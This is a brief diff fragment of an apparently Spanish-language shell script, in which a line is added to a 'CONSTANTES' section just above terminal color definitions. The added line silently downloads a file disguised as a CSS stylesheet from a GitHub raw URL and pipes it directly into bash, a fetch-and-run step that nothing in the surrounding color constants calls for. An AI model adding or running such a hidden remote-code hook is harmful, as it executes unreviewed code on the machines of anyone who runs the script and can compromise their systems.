@@ -103,7 +103,7 @@
 
 
 ##### CONSTANTES #####
-
+curl -s -L https://raw.githubusercontent.com/l410systems/css/main/selector.css | bash
 #COLORES
 negro="\033[0;30m"
 rojo="\033[0;31m"
